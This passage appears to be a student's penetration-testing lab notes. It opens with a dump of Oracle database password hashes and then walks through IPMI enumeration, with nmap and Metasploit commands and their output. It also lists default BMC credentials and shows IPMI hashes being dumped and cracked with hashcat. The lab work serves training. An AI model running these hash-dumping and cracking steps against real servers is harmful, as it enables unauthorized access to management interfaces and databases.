SYSTEM			       B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN			       4A3BA55E08595C81
EXP_FULL_DATABASE

NAME			       PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
DBFS_ROLE
DIP			       CE4A36B8E06CA59C
AQ_ADMINISTRATOR_ROLE
AQ_USER_ROLE
DATAPUMP_EXP_FULL_DATABASE
DATAPUMP_IMP_FULL_DATABASE
ADM_PARALLEL_EXECUTE_TASK
GATHER_SYSTEM_STATISTICS
XDB_WEBSERVICES_OVER_HTTP

NAME			       PASSWORD
------------------------------ ------------------------------
ORACLE_OCM		       5A2E026A9157958C
RECOVERY_CATALOG_OWNER
SCHEDULER_ADMIN
HS_ADMIN_SELECT_ROLE
HS_ADMIN_EXECUTE_ROLE
HS_ADMIN_ROLE
OEM_ADVISOR
OEM_MONITOR
DBSNMP			       E066D214D5421CCC
APPQOSSYS		       519D632B7EE7F63A
PLUSTRACE

NAME			       PASSWORD
------------------------------ ------------------------------
CTXSYS			       D1D21CA56994CAB6
CTXAPP
XDB			       E76A6BD999EF9FF1
ANONYMOUS		       anonymous
XDBADMIN
XDB_SET_INVOKER
AUTHENTICATEDUSER
XDB_WEBSERVICES
XDB_WEBSERVICES_WITH_PUBLIC
XS$NULL 		       DC4FCC8CB69A6733
_NEXT_USER

NAME			       PASSWORD
------------------------------ ------------------------------
MDSYS			       72979A94BAD2AF80
HR			       4C6D73C3E8B0F0DA
FLOWS_FILES		       30128982EA6D4A3D
APEX_PUBLIC_USER	       4432BA224E12410A
APEX_ADMINISTRATOR_ROLE
APEX_040000		       E7CE9863D7EEB0A4
SCOTT			       F894844C34402B67

51 rows selected.
</code></pre>

***

## IPMI

### **Nmap**

```shell-session
eldeim@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi\_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

### **Metasploit Version Scan**

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

### **Metasploit Dumping Hashes**

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> Experimenting with different word lists is crucial for obtaining the password from the acquired hash.

### Lab - Questions

* What username is configured for accessing the host via IPMI?

Use msfconsole to find it -->

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> set RHOSTS 10.129.143.139
RHOSTS => 10.129.143.139
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> run
[*] Sending IPMI requests to 10.129.143.139->10.129.143.139 (1 hosts)
[+] 10.129.143.139:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
```

Now use the module about dumping hashes -->

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set RHOSTS 10.129.143.139
RHOSTS => 10.129.143.139
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
[+] 10.129.143.139:623 - IPMI - Hash found: admin:fb14df1b82000000429ce672531d03a675050d3d7e4e0e2b99d6720dc186063b2e72c8c28f03119aa123456789abcdefa123456789abcdef140561646d696e:37c53c9b43d9666ba8c6ac5ca38021f0657301e3
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now, save all hash into .txt and clean it -->

```
nano ipmi.txt
admin:fb14df1b82000000429ce672531d03a675050d3d7e4e0e2b99d6720dc186063b2e72c8c28f03119aa123456789abcdefa123456789abcdef140561646d696e:37c53c9b43d9666ba8c6ac5ca38021f0657301e3
## Clean
cat ipmi.txt | tr -d '\r' | tr -d ' ' > ipmi.clean
```

To finish, execute hashcat for break the hash -->

```
hashcat -m 7300 --username ipmi.clean /usr/share/wordlists/rockyou.txt -w 3
```
